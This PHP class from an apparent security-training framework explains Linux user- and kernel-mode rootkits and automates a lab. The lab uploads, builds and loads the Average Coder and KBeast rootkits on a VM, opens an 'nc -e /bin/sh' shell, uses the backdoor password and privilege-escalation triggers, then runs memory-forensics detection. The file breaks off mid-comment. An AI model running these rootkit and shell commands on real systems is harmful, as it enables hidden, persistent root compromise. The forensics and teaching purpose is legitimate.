<?php 




class rootkit4linux extends trojan4linux{

  /*
  https://github.com/huntergregal/mimipenguin
  https://github.com/DominicBreuker/pspy
   */

    public function __construct($target_vmx_name,$target_ip,$target_port,$attacker_ip,$attacker_port,$file_path_output,$snapshot) {
        parent::__construct($target_vmx_name,$target_ip,$target_port,$attacker_ip,$attacker_port,$file_path_output,$snapshot);
    }
    
    
    
    function rootkit4linux_intro() {
        $this->ssTitre(__FUNCTION__);
        // ssTitre("Evil Driver"); requette("lsmod");
        $this->article("What is a Rootkit?", "Rootkits are generally grouped into one of two categories: user mode rootkits and kernel mode rootkits.
	The first type, user mode, modifies or replaces operating system components or system binaries that are used directly by the user and run in what is called 'user mode' and the second modifies the kernel itself.
	Rootkits have taken on these names most likely because they accurately reflect the level at which they run on the computer.");
        
        $this->article("Rootkit", "Un des packages les plus connus pour installer des backdoors se nomme le rootkit.
	Il peut facilement etre trouve sur le web en le cherchant sur un moteur de recherche.
	Dans le README du rootkit, on retrouve les fichiers typiques que l'on peut installer:
            
	z2 - enleve les entrees dans utmp, wtmp, et lastlog.
	Es - Le sniffer rokstar pour les noyaux bases sur sun4.
	Fix - falsifie des checksums, installe avec les meme dates/perms/u/g.
	Sl - devenir root par un password magique envoye au login.
	Ic - modifie ifconfig pour enlever le drapeau de sortie PROMISC.
	ps: - cache les processus.
	Ns - modifie netstat pour cacher les connexions de certaines machines.
	Ls - cache certains repertoires et fichiers.
	du5 - cache l'espace utilise sur votre disque dur.
	ls5 -  cache certains repertoires et fichiers.
            
            
	inetd, the network super daemon, is also often trojaned.  The daemon
	will listen on an unusual port (rfe, port 5002 by default in Rootkit
	IV for Linux).  If the correct password is given after connection, a
	root shell is spawned and bound to the port.  The manner in which the
	shell is bound makes it essential to end all commands with a
	semi-colon (\";\") in order to execute.
            
	rshd is similarly trojaned.  A root shell is spawned when the rootkit
	password is given as the username (i.e. rsh <hostname> -l <rootkit
	password> will get you in to the compromised machine).
            
	Programs that hide the crackers presence:
	ls, find, du - will not display or count the crackers files
	ps, top, pidof - will not display the cracker's processes
	netstat - will not display the attackers traffic, usually used to hide
	daemons such as eggdrop, bindshell, or bnc.
	killall - Will not kill the attackers' processes.
	ifconfig - Will not display the PROMISC flag when sniffer is running
	crontab - Will hide the crackers' crontab entry.  The hidden crontab
	entry is in /dev by default!
	tcpd - Will not log connections listed in the configuration file.
	syslogd - Same as tcpd	");
        
        $this->article("Rootkit Why to use it", "Installing a rootkit on a system requires root level access for either type of rootkit.
	How an attacker gains root level access to a system is beyond the scope of this paper but may be accomplished, for example, by stealing credentials or launching an exploit of some sort.
	Once the attacker has root level access, the rootkit can be injected into the system.");
        
        $this->article("User mode rootkits", "A user mode rootkit modifies operating system executable files or libraries that interact with the kernel on the user’s behalf.
	Examples of executable files that a rootkit might want to target include the system binaries ls, ps, netstat and sshd.
	These allow the user to view files, processes, network connections and perform remote logins respectively.");
        
        $this->article("How a user mode rootkit gets injected into a system ?", "Since the goal of a rootkit is to provide an attacker with a stealthy environment in which to carry out his activities, the attacker does not want to raise any suspicion.
	In other words, it is paramount that the system appear to be functioning normally.
Therefore, the executables that the attacker replaces must be placed where the users expect to find them. On most Linux systems these files are located in either /bin,
/usr/bin, /sbin or /usr/sbin (Nguyen, 2004).
	Typically, these directories are owned by root and other users are only allowed to execute the programs. For this reason, the attacker must have root level access in order to place his malicious files on the system.
Once the attacker gains root level access, perhaps by guessing or cracking the password, he can insert his own malicious executable files or libraries, for example, by using the cp
(copy) command to overwrite the existing version of a binary like netstat with his version of netstat.");
        
        $this->article("How the user mode rootkit functions", "How the user mode rootkit functions User mode rootkits provide a stealthy environment to the attacker by hiding the attackers activities.
This is usually accomplished by adding filtering capability to an executable file so that users, including system administrators, receive only the output that the attacker wants them to receive.
For example, if the attacker wants to open up a port that he will use as a backdoor into the system, he will add functionality to programs like netstat or lsof that report information about open ports.
The added functionality will filter the output that is returned to the user, showing the state of all ports except the attacker’s chosen backdoor port.
The attacker adds this functionality by modifying the source code for those programs, compiling and then installing on the target computer.
If the attacker wants to launch a process that will exfiltrate data from a system, he will hide his activities by modifying and installing malicious executables that report information about both the processes running on the system and the current network connections.
	These malicious executables will then “lie” to the user by omitting the attackers malicious process and port information.");
        
        $this->article("Kernel mode rootkits", "Kernel mode rootkits manipulate the information sent back from the kernel to user mode programs by interfering with the system call table.
System calls are the 'fundamental interface between and application and the Linux kernel' the system call table is a kernel data structure that maintains pointers to the locations in kernel memory where these system calls reside.
A kernel mode rootkit can consistently 'lie' to any user mode process that issues those system calls.
For example, in order for a user mode rootkit to hide a file it would have to alter and install malicious copies of all binaries that show files on the system.
Since most of those binaries are using the same system call to query the file system, the kernel mode rootkit can fool them all without even knowing who is asking.
	");
        
        $this->article("How a kernel mode rootkit gets injected into the system ?", "
A rootkit can be injected into the system in one of several ways.
Once injected into a system, the rootkit may use a variety of techniques to interfere with the system call table.
            
There are currently three known methods for injecting a kernel mode rootkit into a system:
            
	1- (insmod) The first and still the most common method is by installing a loadable kernel
module (LKM). LKMs were introduced to Linux around 1995 (Henderson, 2001).
LKMs provide flexibility for both administrators and developers by allowing kernel level
code to be added to or removed from a running kernel. In other words, this feature
allows privileged users to alter the functionality of the kernel without recompiling it and
often without requiring a reboot. LKMs were designed in 1995 to be used for device
drivers, system calls, network drivers and some file system drivers (Henderson, 2001,
Section 2.5). But shortly thereafter, attackers began using LKMs to manipulate the
kernel in order to hide their malicious activities. The attacker must have root privileges
but once she does, she can insert a malicious module into the kernel using, for example,
the insmod or modprobe command. Insmod is a simple utility that inserts a module from
any path and modprobe will load a module and any dependencies but the module must
exist in the /lib/modules directory (Corbet & Rubini, 2005, Section 2.4.2). Placing a
module in the /lib/modules directory may get noticed so attackers will often use the
simpler insmod method. The Linux utility lsmod will provide the user with a listing of
the currently inserted kernel modules. Lsmod gets the information by querying the /proc
directory, specifically /proc/modules.
	The /proc directory :
The /proc directory in Linux provides information to processes about kernel
memory allocation. The directories found in /proc are sometimes called virtual
directories because they do not actually exist on disk. The /proc files are organized
representations of some of the information stored in memory regarding running processes
(Terrehon & Bauer, 1999). Every time a process starts or finishes, a new directory is
created under /proc. The PID for the process is used as the directory name. There are
other directories under /proc like /proc/modules and /proc/net. /proc/modules contains
information about loadable kernel modules and /proc/net contains information about
network connections. Some of the user mode utilities that system administrators use like
            
	2- (/dev/kmem) The second method used by attackers to inject a kernel mode rootkit is by using
the special character device /dev/kmem. This was first demonstrated with the release of
Phrack magazine #58 in 2001 with a rootkit named SucKIT. The authors state that the
name stands for “stupid ‘super user control kit’” (devik & sd, 2001).
The special device /dev/kmem points to an image of the running kernel’s memory
space. Using this technique the attacker modifies the running kernel in memory
interfering in the same way that a LKM might with the system call table (Skoudis &
Zeltser, 2003). Since these are changes made to the running kernel in memory, a system
reboot would cripple the rootkit. Because it was more often used by attackers than by
kernel developers, many current Linux distributions have disabled support for the
/dev/kmem device including Fedora distributions starting in 2005 with the release of
RHEL4 (Fedora wiki, 2014) and Ubuntu distributions in 2009 (Ubuntu wiki, 2014).
            
	3- (/dev/mem) The third method used to inject a kernel mode rootkit is by using a special device
similar to /dev/kmem called /dev/mem. This points to an image of physical memory, that
is, not just kernel memory but the entire physical memory image. This was first
introduced at Blackhat in 2009 (Lineberry, 2009). Based on my research, this method
does not seem to have been widely used although there is a proof-of-concept rootkit from
2005 called phalanx (McClure et el. 2012, p. 304).
Because most Linux kernels still continue to support LKMs this is the method
most often chosen by attackers to inject a rootkit (Corbet & Rubini, 2005, p. 3). Section
5 discusses specific examples of kernel mode rootkits and gives details about how each
was injected.");
        
        $this->article("How system calls are intercepted", "
After a kernel mode rootkit is injected it typically manipulates the system call
table in order to create a stealthy environment for itself. Remember that the system call
table is a kernel data structure that maps the memory locations for the system call
functions used by user mode processes. The rootkit may swap out addresses in the
system call table so that the address points not to the original function but instead to the
attacker’s malicious function. Or the attacker can modify the base location of the system
call table itself, basically replacing the entire legitimate call table with the attacker’s
table. Other methods, though not widely used, include listening in on and intercepting
system interrupts and intercepting communications with the virtual file system (McClure
et al., 2012, p. 305).
The Linux utility ps can show running processes on a system. Rootkits commonly attempt to hide the attacker’s processes to prevent detection.
A user mode rootkit could do this by modifying the ps binary file so that it omits the attackers processes from process listings.
However the system calls are interfered with, the goal of the rootkit is to modify information seen by users in order to hide its own processes and files and activities.
Netstat provides information about network connections and open ports.
Sniffing network traffic, especially in promiscuous mode, allows an attacker to capture data transfers that may contain sensitive data. Attackers may attempt to conceal
the sniffer by installing a modified version of the ifconfig utility, which reports on the state of network interfaces.
Since malware will often attempt to connect back to an attacker’s machine in order to transfer data between the attacker and victim, rootkits will commonly attempt to hide those connections to help maintain stealth.	");
        
        $this->article("SUID bit set", "any binaries that have the SUID bit set.
	This means that the file, when executed, inherits the permissions of the owner of the file instead of as the user executing the file. This could allow a non-privileged user to execute a program as a privileged user");
        
    }
    function rootkit4linux_fonctionnement() {
        $this->ssTitre(__FUNCTION__);
        $this->question("Why we need to Hook read function ?");
        $this->article("Response", "inorder to hide file or directory, The hiding is performed through file system function hooking.
On Linux, every fs driver provides functions to open, read, write and perform operations with files and directories.
This functions are stored in a struct file_operations, stored inside every inode.
Therefore, every file_operations contains a pointer to the open, read, write(and many other) functions which will be called whenever a user tries to execute those actions on a filesystem object.
So what i did was to retrieve a certain inode and modify the pointer to its read function, replacing it with my own function.
In this new function, filtering on the input was performed, in order to remove the entries i wanted to hide.");
        
        $this->question("Why we need to Hook a open() function");
        $this->article("Exemple Hiding TCP connection", "Let's take for example the connection hiding mechanism.
netstat takes tcp connections information from a virtual file named /proc/net/tcp.
This file contains one entry per line, each one indicating source and destination port, source and destination address and more information about each open connection.
In order to hide a certain connection, i replaced the default read function with my own, in which i read entries on that file and skipped those containing the port i needed to hide.");
        
        $this->question("Why we need to Hook a write() function");
        $this->article("Response", "inorder to put a command to my rootkit, previlege escalator, I added a write function pointer to the file /proc/buddyinfo, which by default has no write permissions. So after hooking that function, whenever any user writes something to that virtual file, the rootkit will read what was wrote and execute actions based on the input. ");
    }
    
    
    
    function rootkit4linux_kernel_avgcoder() {
        $this->titre(__FUNCTION__);
        /*
        $this->rootkit4linux_kernel_avgcoder_intro ();
        $this->rootkit4linux_kernel_avgcoder_download ();
        $this->rootkit4linux_kernel_avgcoder_install ();
        $this->rootkit4linux_kernel_avgcoder_execution ();
        */
        $this->rootkit4linux_kernel_avgcoder_forensics ();
        $this->rootkit4linux_kernel_avgcoder_conclusion ();
    }
    function rootkit4linux_kernel_avgcoder_intro() {
        $this->ssTitre(__FUNCTION__);
        $this->article("The Average Coder rootkit", "The Average Coder rootkit was written by Matias Fontanini and uses the LKM method of injection (Fontanini, 2011).
	This rootkit can hide the kernel module from user mode tools that print the contents of /proc/modules, like lsmod, and it can also hide ports and processes.
	It does not offer a file hiding function.");
        
        $this->article("Average coder", "It has the ability to hide itself from lsmod, hide processes, tcp connections, logged in users and to give uid 0 to any running process. ");
        
        $this->article("a write() function", " a write function pointer to the file /proc/buddyinfo, which by default has no write permissions.
	So after hooking that function, whenever any user writes something to that virtual file, the rootkit will read what was wrote and execute actions based on the input.
	The commands it supports are the next ones:
    hide/show. This commands hide/show the rootkit from lsmod(actually from /proc/modules).
    hsport PORT/ssport PORT. Hides(hsport) connection which have PORT as their source port, or \"unhides it\"(ssport) if it was previously hidden.
    hdport PORT/sdport PORT. Same as above but using destination port instead of source.
    hpid PID/spid PID. Hides or \"unhides\" a process that has PID as its pid. This is done by hooking the /proc readdir pointer.
    huser USER/suser USER. This commands hide or \"unhide\" a logged in user, so that who or other similar commands won't indicate USER is logged in the system.
	This is done by hooking /var/run/utmp.
    root PID. This makes the process identified by PID to contain uid 0 and gid 0.
	This is kind of dirty but works well; the credentials struct from the init process is copied to the process identified by PID.
	");
        $this->article("Previlege Escalator", "The Average Coder Rootkit is a Linux kernel rootkit that operates as a loadable kernel module and provides the ability to hide processes, logged in users, and kernel modules.
	It also provides the ability for a userland process (e.g. bash) to elevate itself to root privileges by writing to a file inside of /proc.");
        
        $this->article("readdir, open, write function ", "Average Coder gains control over a computer by loading as a kernel module and then overwriting a number of file_operations structures within the kernel.
	file_operations is a C structure used by the Linux kernel to provide generic handling of files by a number of subsystems within the kernel and contains function pointers such as read, write, readdir, open, close, etc.
	Each active file in the operating system has its own file_operations structure that is referenced every time activity is performed on the file (e.g when a file is read, the read function pointer of the structure is eventually called to handle reading the file contents from disk). ");
        
        $this->pause();
    }
    function rootkit4linux_kernel_avgcoder_download() {
        $this->ssTitre(__FUNCTION__);
        $this->net("https://github.com/mfontanini/Programs-Scripts/tree/master/rootkit");
    }
    function rootkit4linux_kernel_avgcoder_install() {
        $this->ssTitre(__FUNCTION__);
        $victime = new vm($this->target_vmx_name);
        $victime->vm2upload("$this->dir_tools/Malware/rootkit4linux_kernel_avgcoder.tar.gz", "$this->vm_tmp_lin/rootkit4linux_kernel_avgcoder.tar.gz");
        $this->cmd($this->target_ip, "tar -xvzf $this->vm_tmp_lin/rootkit4linux_kernel_avgcoder.tar.gz");
        $this->cmd($this->target_ip, "cd $this->vm_tmp_lin/rootkit4linux_kernel_avgcoder; make");
        $this->cmd($this->target_ip, "cd $this->vm_tmp_lin/rootkit4linux_kernel_avgcoder;sudo insmod rootkit.ko");
    }
    function rootkit4linux_kernel_avgcoder_execution() {
        $this->ssTitre(__FUNCTION__);
        // vm_revert2snapshot($ub1004, "rootkit_avgcoder_installed");pause();
        $this->cmd($this->target_ip, "history");
        $this->pause();
        $victime = new vm($this->target_vmx_name);
        $victime->vm2upload("$this->dir_c/preloadcheck.c", "$this->vm_tmp_lin/preloadcheck.c");
        $this->cmd($this->target_ip, "gcc $this->vm_tmp_lin/preloadcheck.c -o $this->vm_tmp_lin/preloadcheck -ldl ");
        $this->pause();
        
        $this->ssTitre("Hidden Connection");
        $pid = "12384";
        $ppid = "11460";
        
        $this->article("hidden connection", "Hide the listening port to prevent netstat or lsof from revealing it");
        $this->cmd($this->prof, "nc -l 5544 -v");
        $this->cmd($this->target_ip, "nc.traditional $this->prof 5544 -v -e /bin/sh ");
        $this->ssTitre("PID of my Bash Shell");
        $this->cmd($this->target_ip, "echo $$");
        $this->pause();
        $this->for4linux_Dyn4invest_port($this->target_ip, 5544);
        $this->cmd($this->target_ip, "echo \"hdport 5544\" >> /proc/buddyinfo ");
        $this->for4linux_Dyn4invest_preload_library($this->target_ip, "/bin/netstat");
        $this->for4linux_Dyn4invest_preload_library($this->target_ip, "/bin/lsof");
        $this->pause();
        
        $this->ssTitre("Hidden Kernel Module");
        $this->for4linux_Dyn4invest_module($this->target_ip, "rootkit"); // reste visible dans $ ls /sys/module | grep 'rootkit'
        $this->cmd($this->target_ip, "echo hide >> /proc/buddyinfo ");
        $this->todo("Erreur generé est normal -> la cause ");
        $this->cmd($this->target_ip, "ls -al /proc/buddyinfo ");
        $this->cmd($this->target_ip, "file /proc/buddyinfo ");
        $this->note("'buddyinfo' is a standard Linux file found in the /proc directory.
	It does not have write access for any users, so an attempt to write to it with 'echo hide' results in an error but since the rootkit has intercepted the write function for this file it can receive the 'echo hide' and interpret it as a command, in this case, a command to hide the kernel module from users");
        $this->for4linux_Dyn4invest_preload_library($this->target_ip, "/bin/lsmod");
        $this->pause();
        
        $this->ssTitre("Hidden Process");
        $this->for4linux_Dyn4invest_pid($this->target_ip, $pid);
        $this->cmd($this->target_ip, "echo \"hpid $pid\" >> /proc/buddyinfo  ");
        $this->for4linux_Dyn4invest_preload_library($this->target_ip, "/bin/ps");
        $this->pause();
        
        $this->ssTitre("Hidden User");
        $this->for4linux_Dyn4invest_user($this->target_ip, "");
        $this->cmd($this->target_ip, "echo \"huser rohff\" >> /proc/buddyinfo ");
        $this->for4linux_Dyn4invest_preload_library($this->target_ip, "/bin/who");
        $this->cmd($this->target_ip, "$this->vm_tmp_lin/preloadcheck /bin/id");
        $this->pause();
        
        $this->ssTitre("Privilege Escalator");
        $this->for4linux_Dyn4invest_user($this->target_ip, "");
        $this->cmd($this->target_ip, "echo \"root $$\" >> /proc/buddyinfo  ");
        $this->pause();
    }
    function rootkit4linux_kernel_avgcoder_forensics() { 
        $this->ssTitre(__FUNCTION__);
        $this->ssTitre("Analyzing Average Coder rootkit - Kernel Based Rootkits -- Kernel Mode Rootkit Examples");
       
        $pid = "12384";
        $ppid = "11460";
        $module = "rootkit";
        $pid_rootkit = 10956;
        $filter = "";
        
        $rootkit4linux_kernel_avgcoder = new bin4linux($this->file_path, $this->attacker_port); // "LinuxUbuntu10040x86"
       // $rootkit4linux_kernel_avgcoder->for4linux_all("");  $this->pause();
        
        
        //$rootkit4linux_kernel_avgcoder->for4linux_investigation_linux_first_pid($rep_path,$vmem,$profile,$pid);exit();
         
        $rootkit4linux_kernel_avgcoder->for4linux_Networking_connexion_netstat(" grep -i 'established' ");

         
        $rootkit4linux_kernel_avgcoder->for4linux_Process_psxview(" | egrep \"($pid|$ppid|$pid_rootkit)\" ");
        $rootkit4linux_kernel_avgcoder->for4linux_Process_psxview_dot();
        $this->pause();
        $rootkit4linux_kernel_avgcoder->for4linux_Process_pslist("--pid=$pid,$ppid");
        $rootkit4linux_kernel_avgcoder->for4linux_Process_pslist_dot();
        $rootkit4linux_kernel_avgcoder->for4linux_Process_pstree("--pid=$pid,$ppid");
        $rootkit4linux_kernel_avgcoder->for4linux_Process_pstree_dot();
        $rootkit4linux_kernel_avgcoder->for4linux_Process_file_open_lsof("--pid=$pid,$ppid");
        $this->titre("Search hidden user");
        $rootkit4linux_kernel_avgcoder->for4linux_Malware_check_hidden_user("");
        $this->note("Deleted entry -> rohff    pts/0        2015-05-05 09:15 (:0.0) ");
        $this->pause();
         
        $this->titre("Search Privilege escalator");
        $rootkit4linux_kernel_avgcoder->for4linux_Malware_check_hidden_privilege_escalator("");
        $this->note("In real investigations, we could now focus our efforts on PID $pid - using the bash plugin would be a good start – as we know that the attacker used that shell in conjunction with the rootkit!");
         $this->pause();
         
         $rootkit4linux_kernel_avgcoder->for4linux_Process_maps("--pid=$pid");
         $this->pause();
         
         $this->titre("Investigation into Suspects Process");
         $rootkit4linux_kernel_avgcoder->for4linux_Malware_plthook("--pid=$pid,$ppid,$pid_rootkit"); // pause();
         $this->pause();
         
         $rootkit4linux_kernel_avgcoder->for4linux_Dump_heap($pid, ""); $this->pause();
         $rootkit4linux_kernel_avgcoder->for4linux_Dump_stack($pid, ""); $this->pause();
         $rootkit4linux_kernel_avgcoder->for4linux_Process_psenv("--pid=$pid,$ppid,$pid_rootkit");
         $this->pause();
         
         $rootkit4linux_kernel_avgcoder->for4linux_Information_library_list("--pid=$pid,$ppid,$pid_rootkit");
         
         $rootkit4linux_kernel_avgcoder->for4linux_Malware_check_hidden_modules_and_dump("");
         $this->todo("dumper apartir de cette adresse ou bien connaitre le nom de t& pour pouvoir le dumper en moddump ");
         $this->pause();
         
         $rootkit4linux_kernel_avgcoder->for4linux_Information_kernel_loaded_modules(" | grep 'rootkit' ");
        $this->note("Volatility was able to report the three hooks placed by Average Coder (readdir from root of proc, write of buddyinfo, and read of modules), by enumerating all the files and directories under /proc and verifying their members.
         From here, the investigator knows the machine is compromised and can begin to investigate the rootkit.");
         $this->pause();
         
         $this->ssTitre("Plus de details");
         $rootkit4linux_kernel_avgcoder->for4linux_Information_kernel_loaded_modules("--pid=$pid,$ppid,$pid_rootkit -P | tee $this->file_dir/$this->file_name.linux_lsmod_P");
         
         $rootkit4linux_kernel_avgcoder->for4linux_Dump_file("/tmp/VMwareDnD/bffa8b60/avgcoder/rootkit.c", "");
         $this->requette("gedit $this->file_dir/$this->file_name._tmp_VMwareDnD_bffa8b60_avgcoder_rootkit.c.bak");
         $rootkit4linux_kernel_avgcoder->for4linux_Dump_file("/sys/module/rootkit", "");
         
         $this->pause();
         
         $this->ssTitre("Dumping Evidence");
         $file_check_module = $rootkit4linux_kernel_avgcoder->for4linux_Malware_check_modules("");
         $tmp = $this->req_ret_tab("grep -Po \"0x[0-9a-fA-F]{4,16}\" $file_check_module ");
         $inode_module = $tmp [0];
         unset($tmp);
         $this->pause();
         
         
         
         $tab_lkm = file($rootkit4linux_kernel_avgcoder->for4linux_Dump_Module_Kernel($inode_module,"--regex=$module | grep -Po \"$module.0x[0-9a-fA-F]{4,16}.lkm\" ")); // pause();
         foreach ($tab_lkm as $lkm){
             $lkm = trim($lkm);
             if (!empty($lkm)){
             $file_lkm = new bin4linux($lkm);
             $file_lkm->file_file2virus4scan();
             }
         }
         $this->pause();
         
         $this->note("jetter un coup d'oeil dans l'historique");
         $rootkit4linux_kernel_avgcoder->for4linux_Information_bash_history("");
         $rootkit4linux_kernel_avgcoder->for4linux_Information_bash_history("-P"); // pause();
         $this->pause();
         
         $rootkit4linux_kernel_avgcoder->for4linux_Information_find_file_name("/proc/buddyinfo", "");
         $this->pause();
    }
    function rootkit4linux_kernel_avgcoder_conclusion() {
        $this->ssTitre(__FUNCTION__);
        $this->article("Analyse", "Analyzing Average Coder:
	• Loads as an LKM
	• Hides processes, logged in users, and kernel modules
	• Operates by overwriting file_operation structures in the kernel
            
file_operations:
	• One for each active file in the kernel
	• Has function pointers open, close, read, readdir, write, and so on
	• Referenced every time a file is accessed by the kernel
	• By hooking a file’s ops structure, a rootkit can control all interactions with the file
            
Detecting f_op hooks
	• The linux_check_fop plugin enumerates the /proc filesystem and all opened files and verifies that each member of every file ops structure is valid
	• Valid means the function pointer is either in the kernel or in a known (not hidden) loadable kernel module
            
Hiding the Kernel Module
	• Average Coder hides itself by hooking the read member of /proc/modules
	• This is the file used by lsmod to list modules
	• This effectively hides from lsmod and the majority of other userland tools
            
Hiding Processes
	• There is one directory per-process under /proc, named by the PID
– e.g. init has a directory of /proc/1/
	• To hide processes, the readdir member of /proc is hooked
	• PIDs to be hidden are filtered out
            
Communicating with Userland
	• Average coder receives commands from the attacker through /proc/buddyinfo
	• Hooks the write member which normally is unimplemented
            
Hiding Users
	• /var/run/utmp stores logged in users
	• Avg Coder uses path_lookup to find the inode structure for this file
	• It then hooks the read member of the i_fop structure to filter out hidden users from w and who");
        $this->pause();
    }
    
    
    
    function rootkit4linux_kernel_kbeastv1() {
        $this->titre(__FUNCTION__);
        /*
        //$vm = new vm($this->target_vmx_name);  if (!empty($this->snapshot)) $vm->vm2revert2snapshot($this->snapshot);
        $this->rootkit4linux_kernel_kbeastv1_intro ();
        $this->rootkit4linux_kernel_kbeastv1_download ();
        $this->rootkit4linux_kernel_kbeastv1_install ();
        $this->rootkit4linux_kernel_kbeastv1_execution ();
        */
        $this->rootkit4linux_kernel_kbeastv1_forensics ();
        $this->rootkit4linux_kernel_kbeastv1_conclusion();
    }
    function rootkit4linux_kernel_kbeastv1_intro() {
        $this->ssTitre(__FUNCTION__);
        $this->article("What is it ?", "KBeast is an LKM Linux rootkit that was developed in 2012 by IPsecs and was based on the publicly known rootkit.
	It was made to support kernel versions 2.6.16, 2.6.18, 2.8.32, and 2.6.35.
	KBeast supports several features commonly seen in kernel mode rootkits such as hiding the loadable kernel module, files, directories, processes, sockets, and connections.
	The beast also comes with a password protected backdoor which is hidden from other applications by the kernel module.");
        
        $this->article("Why KBeast?", "We chose to analyze KBeast because it is one of the more recent rootkits and showcases the kernel mode rootkits that are more sophisticated than user mode and more popular today.
	The beast was created for mostly educational and analysis purposes thus many technical papers using the beast were available.
	Also, the source code for the beast is publicly available on the IPsecs website which allowed us to deconstruct and analyze the rootkit at a much deeper level");
        
        $this->article("Intro KBeast", "is a kernel mode rootkit that loads as a kernel module.
	It also has a userland component that provides remote access to the computer.
	This userland backdoor is hidden from other userland applications by the kernel module.
	KBeast also hides files, directories, and processes that start with a user defined prefix.
	Keylogging abilities are also optionally provided.
	KBeast gains its control over a computer by hooking the system call table and by hooking the operations structures used to implement the netstat interface to userland.
	We will know go through each piece of functionality the rootkit offers, how it accomplishes it, and how we can detect it with Volatility.");
        
        $this->article("KBeast", "Kbeast hides the loaded kernel module as well as files, processes and ports.
	In addition, this rootkit offers a password protected backdoor");
        
        $this->note("The kbeast rootkit has a configuration file that can be edited before compiling.
	It contains many settings for the rootkit, including the port number that the rootkit will automatically hide, the backdoor password and the prefix to use for hidden files,
directories and processes.
	For this test, the default values were used. The hidden port number is 13377, the backdoor password is “h4x3d”, and the special prefix is “_h4x_”.");
    }
    function rootkit4linux_kernel_kbeastv1_download() {
        $this->ssTitre(__FUNCTION__);
        $this->net("http://core.ipsecs.com/rootkit/kernel-rootkit/kbeast-v1/");
    }
    function rootkit4linux_kernel_kbeastv1_install() {
        $this->ssTitre(__FUNCTION__);
        $victime = new vm($this->target_vmx_name);
        $victime->vm2upload("$this->dir_tools/Malware/rootkit4linux_kernel_kbeastv1.tar.gz", "$this->vm_tmp_lin/rootkit4linux_kernel_kbeastv1.tar.gz");
        $this->cmd($this->target_ip, "tar -xvzf $this->vm_tmp_lin/rootkit4linux_kernel_kbeastv1.tar.gz -C $this->vm_tmp_lin");
        $this->note("modify config.h to meet your requirement, remember that _MAGIC_NAME_ must be user with sh/bash shell");
        $this->cmd($this->target_ip, "gedit $this->vm_tmp_lin/rootkit4linux_kernel_kbeastv1/config.h");
        //$this->cmd($this->target_ip, "cd $this->vm_tmp_lin/rootkit4linux_kernel_kbeastv1;sudo insmod rootkit.ko");
        $this->cmd($this->target_ip, "grep -v -e '^$' /etc/passwd | grep bash");
        $this->cmd($this->target_ip, "cd $this->vm_tmp_lin/rootkit4linux_kernel_kbeastv1;sudo bash ./setup build 1");
        $this->pause();
    }
    function rootkit4linux_kernel_kbeastv1_execution() {
        $this->ssTitre(__FUNCTION__);
        $this->requette("tar -xvzf $this->dir_tools/Malware/rootkit4linux_kernel_kbeastv1.tar.gz -C $this->file_dir");
        $this->requette("cat $this->file_dir/rootkit4linux_kernel_kbeastv1/config.h | grep  -i -n \"#define\" ");
        $this->requette("cat $this->file_dir/rootkit4linux_kernel_kbeastv1/ipsecs-kbeast-v1.c | grep  -i -n \"Features:\" -A9 ");
        $this->pause();
        
        $pid = "2856";
        $module_name = "ipsecs_kbeast_v1";
        
        $victime = new vm($this->target_vmx_name);
        $victime->vm2upload("$this->dir_c/preloadcheck.c", "$this->vm_tmp_lin/preloadcheck.c");
        $this->cmd($this->target_ip, "gcc $this->vm_tmp_lin/preloadcheck.c -o $this->vm_tmp_lin/preloadcheck -ldl ");
        $this->pause();
        
        $this->chapitre("Kbeast v1 execution");
        $this->article("Start Kbeast Backdoor", "cd /usr/_h4x_/; ./_h4x_bd");
        $this->ssTitre("send exec to virustotal");
        $victime->vm2download("/usr/_h4x_/_h4x_bd", "$this->vm_tmp_lin/_h4x_bd.elf");
        $check = new bin4linux("$this->vm_tmp_lin/_h4x_bd.elf");
        //$check->file_file2virus2vt();
        $this->pause();
        
        
        $this->ssTitre("hidden Process");
        $this->for4linux_Dyn4invest_pid($this->target_ip, $pid);$this->pause();
        
        $this->ssTitre("Connection hidden");
        $this->cmd($this->attacker_ip, "nc $this->target_ip 13377 -v");
        $this->cmd($this->attacker_ip, "enter Password h4x3d");
        $this->for4linux_Dyn4invest_port($this->target_ip, 13377);
        $this->cmd($this->target_ip, "$this->vm_tmp_lin/preloadcheck /bin/netstat");
        $this->pause();
        $this->note("the system calls getsid(), getpid() and kill() looking for discrepancies in order to discover hidden processes.
	The kill() call is actually hooked by the rootkit.");
        
        $this->ssTitre("hidden Module");
        $this->note("lsmod uses the /proc/modules output as its source of information about loaded modules it does not see the kbeast kernel module.");
        $this->for4linux_Dyn4invest_module($this->target_ip, $module_name);
        $this->cmd($this->target_ip, "$this->vm_tmp_lin/preloadcheck /bin/lsmod");
        $this->pause();
        
        $this->ssTitre("hidden File and Directory");
        $this->ssTitre("Kbeast hides files that begin with special prefix");
        $this->note("Any files that begin with the special prefix “_h4x_” are successfully omitted from ps output");
        $this->cmd($this->attacker_ip, "echo 'test1' > test1.txt ; echo 'donnees cachees' > _h4x_test2.txt ;echo 'test3' > test3.txt ");
        $this->cmd($this->attacker_ip, "cd /usr/_h4x_/; ls *.txt ; cat _h4x_test2.txt");
        $this->cmd($this->target_ip, "$this->vm_tmp_lin/preloadcheck /bin/ls");
        $this->pause();
        
        
        
        $this->ssTitre("Privilege escalator");
        $this->cmd($this->target_ip, "kill -37 31337 ");
        $this->for4linux_Dyn4invest_user($this->target_ip, "");
        $this->ssTitre("Attempting to kill a process protected by the kbeast rootkit");
        $this->note("Additionally, the kbeast configuration file states that any processes starting with the defined prefix of '_h4x_' will be protected from kill:
	/* All files, dirs, process will be hidden Protected from deletion & being killed */
#define _H4X0R_ '_h4x_' ");
        $this->note("The configuration file shows how to use the kill command to elevate privileges:
/* Magic signal & pid for local escalation */
#define _MAGIC_SIG_ 37 //kill signal
#define _MAGIC_PID_ 31337 //kill this pid");
        $this->todo("sous root -> kill -0 <PID kbeast run> -> permission denied");
        $this->pause();
        $this->ssTitre("hidden PID");
        $pids = explode(",", $pid);
        foreach($pids as $pid_id)
            $this->for4linux_Dyn4invest_pid($this->target_ip, $pid_id);
            
            $this->cmd($this->target_ip, "$this->vm_tmp_lin/preloadcheck /bin/ps");
            $this->pause();
    }
    
    
    
    public function rootkit4linux_kernel_kbeastv1_forensics() {
        $this->ssTitre(__FUNCTION__);
        // cat kbeast.all | egrep "(11669|11838|12936|kbeast|h4x|h4ck3r)" | more
        /*
         * rajouter ls /usr/ | grep '_h4x_'
         */

        
        $pid = "3199";
        $ppid = "2937";
        $deamon = "2856";
        $module_name = "ipsecs_kbeast_v1";
        $chaine = "_h4x_";
        $chaine_more = "h4x";
        
        
       // $victime = new vm($this->target_vmx_name);
        /*
         * rohff@ubuntu:~$ echo 'test h4ck3r d4t4' > /home/rohff/Desktop/_h4x_h4dedata.txt
